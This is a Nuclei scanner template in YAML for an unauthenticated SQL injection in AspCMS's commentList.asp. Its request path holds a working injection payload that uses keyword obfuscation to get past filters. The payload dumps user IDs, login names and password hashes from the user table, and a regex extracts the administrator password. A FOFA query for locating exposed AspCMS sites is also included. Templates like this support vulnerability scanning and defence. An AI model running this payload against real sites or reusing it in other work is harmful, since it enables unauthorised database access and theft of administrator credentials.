http:
- extractors:
  - group: 1
    name: admin_password
    regex:
    - <div class="line2">(.*?)</div>
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - contains(body,'clistbox') && contains(body,'UserID,GroupID,LoginName,Password')
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
id: aspcms-commentlist-sqli
info:
  author: SleepingBag945
  description: 'An SQL injection vulnerability has been identified in the commentList.asp
    file of AspCMS. Exploiting this vulnerability, an attacker can illicitly acquire
    the administrator''s MD5 password.

    '
  metadata:
    fofa-query: app="ASPCMS"
    max-request: 1
    verified: true
  name: AspCMS commentList.asp - SQL Injection
  reference:
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/cms/AspCMS/AspCMS%20commentList.asp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: high
  tags: aspcms,sqli,unauth,vuln
